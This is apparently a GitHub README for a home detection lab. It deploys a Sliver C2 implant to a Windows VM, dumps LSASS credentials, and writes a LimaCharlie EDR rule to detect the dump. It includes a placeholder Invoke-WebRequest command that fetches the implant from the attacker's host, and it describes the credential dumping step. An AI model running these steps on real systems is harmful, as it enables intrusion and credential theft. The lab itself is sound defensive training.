# LimaCharlie-EDR-Lab
![Architecture](https://i.imgur.com/6mftsEk.jpg)

## Introduction

I simulated a real-life cyber attack scenario and tested the effectiveness of my security measures. I created two virtual machines on a NatNetwork: an Ubuntu Server acting as the attacker, and a Windows 11 machine as the victim.

To enhance the security of the victim machine, I installed LimaCharlie sensor and Sysmon, which helped me detect any potential attacks or security events. On the Ubuntu Server, I installed [Sliver-Server C2](https://bishopfox.com/blog/sliver), a command and control attack tool. I will be conducting a Credial Gathering attack using LSASS.exe to extract usernames and passwords. 

To test my security measures, I executed the C2 attack and created detection rules to alert administrators of any suspicious activity. This lab project aimed to demonstrate the importance of having robust security measures in place to protect against cyber attacks.


The Technologies and Tools used during this project:

* Virtual Box NatNetwork
* Virtual Machines 
  + Windows 11
  + Ubuntu Server 22.04
* LimaCharlieEDR
* Silver Server 

## Labbing

After environment is set up I created a Sliver-Server C2 implant on the Ubuntu server to install on to the Windows System

![Implant](https://i.imgur.com/LEP0qSk.png)

Next I created quick websever on the Ubuntu machine for the C2 Payload to be installed from, then I ran this command on the Windows device.

![IWR](https://i.imgur.com/dadsDeX.png)

Command: IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]


After downloading the implant we need to run the malicious file 


![Excute](https://i.imgur.com/mkdYQkp.png)

## After Implant is installed on Victum

We can run some commands inside the sliver-server session itself. 

Jumping inside our our session we can run some commands to identify the device we are on.

Whoami - Hostname

Netstat - Network connections

ps -T - Process Tree (sliver Highlights green its own files)

![Tree](https://i.imgur.com/CfmWUyF.png)


## Inside LimaCharlie EDR

After installing the malicious file we should be able to see this inside of our EDR soultion.

First thing to look at is going to be the processes running. After looking around for some time we see this file that does not have a signature(yellow)

![process](https://i.imgur.com/Pts6px0.png)

After finding that process we can go see that this file location is inside the Downloads folder of a user called Victum so we can locate this inside the filesystem section of LimaCharlie

![filesystem](https://i.imgur.com/ksRCp3P.png)

Now we are going to look at the timeline and go through and see what is going on when this file was installed. 

![timeline](https://i.imgur.com/jYVSaNr.png)

We can see that there is a Network Connetion created and the file in question is COMPLEX_BELL the malicious file. 

Usually a next step would be gathering the hash of the file and running this through VirusTotal but when doing this, VirusTotal returns nothing. This indicates that the attacker crafted this file themselves.  

## Credential Grabbing

For attackers getting access to more than one account is critical. A way to do this is gathering creditals from the file lsass.exe. This file holds usernames, passwords and security tokens.

To learn more about LSASS Credential Dumping refer to [Mitre](https://attack.mitre.org/techniques/T1003/001/)

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

Running this command will copy the contents of the lsass file and dump it inside of the attackers host. 

To detect this method of Credential Grabbing we will write a detection rule to detect this technique. 

In LimaCharlie we can enter this detection rule: 

![lsass-detection-rule](https://i.imgur.com/6bDKczs.png)

This rule will detect any interaction with the lsass file. So this could cause a lot of False Postives if administrators are using this file. But for this lab it is a good rule since we dont have any actual users. 

Now if we run the lsass dump command again

![lsass-dump](https://i.imgur.com/1TDbDT7.png)

We will be able to detect it inside of LimaCharlie

![Lima-Detections](https://i.imgur.com/mCsvF9u.png)



